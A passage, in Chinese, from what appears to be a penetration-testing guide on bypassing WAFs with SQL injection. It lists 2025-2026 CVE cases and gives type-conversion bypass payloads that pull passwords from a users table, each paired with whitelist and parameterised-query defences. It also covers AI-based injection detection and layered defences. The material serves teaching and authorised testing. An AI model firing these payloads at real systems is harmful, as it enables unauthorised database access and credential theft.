**参考**：[Claroty Team82 — JS-ON: Security-OFF](https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf)

---

### 19. 2025-2026 真实漏洞案例补充

| CVE/漏洞 | 产品 | 绕过技术 | 说明 |
|----------|------|---------|------|
| CVE-2026-42208 | LiteLLM | API 密钥验证直接拼接用户输入 | AI/LLM 代理框架中的 SQL 注入，API key 验证时未参数化 |
| CVE-2025-14966 | FastAdmin (ThinkPHP) | 强制类型转换绕过黑名单 | 利用 PHP 类型转换特性绕过 SQL 关键字过滤 |
| JeecgBoot v3.8.0 | JeecgBoot | 强制类型转换绕过 SQL 黑名单 | 通过 `intval()` 等类型转换绕过黑名单限制 |
| 禅道 v18.12 | 禅道开源版 | SQL 注入绕过登录限制 | 登录接口存在可利用的注入点绕过认证 |
| CVE-2025-25257 | Fortinet FortiWeb | 前认证 SQL 注入 → RCE | WAF 产品自身存在 SQL 注入（CVSS 9.8） |

#### 19.1 类型转换绕过黑名单详解（JeecgBoot/FastAdmin 案例模式）

```php
// 漏洞模式：黑名单过滤 SQL 关键字，但类型转换可绕过
// 正常请求被拦截：
?id=1 UNION SELECT password FROM users

// 利用类型转换绕过：
?id=1+0 UNION SELECT password FROM users    // "+0" 触发隐式类型转换
?id=1.0 UNION SELECT password FROM users    // 小数点绕过整数检测
?id=1e0 UNION SELECT password FROM users    // 科学计数法绕过
?id=(1) UNION SELECT password FROM users    // 括号包裹绕过

// 防御：白名单而非黑名单
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) { die('Invalid ID'); }
// 或参数化查询（根本解决方案）
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

---

### 20. AI/语义级 SQL 注入检测（2025-2026 防御前沿）

> 传统基于规则/正则的 WAF 已被证明可被绕过。2025-2026 年防御趋势转向 AI 语义级检测。

#### 20.1 Transformer + BBPE 检测技术

```
技术路线：
1. 使用 Byte-Pair Encoding (BBPE) 对 SQL 查询进行分词
2. 训练 Transformer 模型学习正常 SQL 的语义模式
3. 对输入查询进行语义分析，判断是否为注入

优势：
- 无需维护规则库，自适应新型攻击
- 能检测编码/混淆后的注入载荷（传统正则无法匹配）
- 误报率低于传统 WAF

局限：
- 需要大量训练数据
- 推理延迟高于规则引擎
- 对抗性样本攻击仍需研究
```

#### 20.2 语义分析 + SVM 轻量化模型

```
技术路线（H3C 研究方向）：
1. 对 SQL 语句进行语法解析，提取语义特征
2. 使用支持向量机 (SVM) 进行二分类判断
3. 结合传统深度检测引擎作为混合防御

优势：
- 轻量级，适合嵌入式部署（防火墙/网关）
- 语义级检测，不依赖关键字匹配
- 可与传统规则引擎互补
```

#### 20.3 AI 防御部署建议

| 层级 | 措施 | 适用场景 |
|------|------|---------|
| 边缘 WAF | 规则 + AI 混合检测 | 入口流量过滤 |
| 应用层 | 参数化查询 + ORM | 代码级防护 |
| 数据库层 | 最小权限 + 审计日志 | 纵深防御 |
| 运行时 | RASP 语义分析 | 应用内检测 |

---

## 前置条件

- 目标 Web 应用可访问
- Burp Suite / ZAP 或 sqlmap / Ghauri 已安装
- 授权测试范围已确认
- 对于利用阶段：了解目标数据库类型
